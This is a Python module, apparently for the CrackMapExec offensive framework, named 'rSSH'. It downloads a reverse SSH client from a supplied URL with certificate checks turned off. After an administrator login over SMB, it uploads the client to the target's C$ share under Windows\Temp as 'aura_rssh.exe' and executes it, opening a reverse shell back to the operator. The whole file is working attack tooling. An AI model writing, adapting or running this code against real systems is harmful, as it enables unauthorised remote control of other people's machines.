#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import io
import sys
import requests
from requests import ConnectionError

class CMEModule:
    '''
        Execute a reverse ssh shell (https://github.com/NHAS/reverse_ssh)
        Requires the URL to the client module (configured in rSSH)
        Module by @fransla

    '''
    name = 'rSSH'
    description = 'Execute a reverse ssh shell on the target (https://github.com/NHAS/reverse_ssh)'
    supported_protocols = ['smb']
    opsec_safe= False #Does the module touch disk?
    multiple_hosts = True #Does it make sense to run this module on multiple hosts at a time?

    def options(self, context, module_options):
        '''
            RSSH_URL    URL where the rSSH client can be downloaded from
            TMP_DIR     Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
            FILENAME    Filename to use on the target system (default: aura_rssh.exe)
        '''

        self.rssh_url = ""
        self.share = "C$"
        self.tmp_dir = "\\Windows\\Temp\\"
        self.filename = "aura_rssh.exe"

        if 'RSSH_URL' in module_options:
            self.rssh_url = module_options['RSSH_URL']
        else:
            context.log.error('RSSH_URL option is required!')
            sys.exit(1)

        if 'FILENAME' in module_options:
            self.filename = module_options['FILENAME']

        self.rssh_client = None
 
        try:
            r = requests.get(self.rssh_url, verify=False)

            self.rssh_client  = r.content
              
            context.log.success("Got rssh_client")

        except ConnectionError as e:
            context.log.error("Unable to fetch rssh client")
            sys.exit(1)

    def on_admin_login(self, context, connection):
        if self.rssh_client:
            with io.BytesIO(self.rssh_client) as s:
                try:
                    connection.conn.putFile(self.share, self.tmp_dir + self.filename, s.read)
                except Exception as e:
                    context.log.error('Error writing file to share {}: {}'.format(self.share, e))
            connection.execute(self.tmp_dir + self.filename)
            context.log.success('Executed rssh client')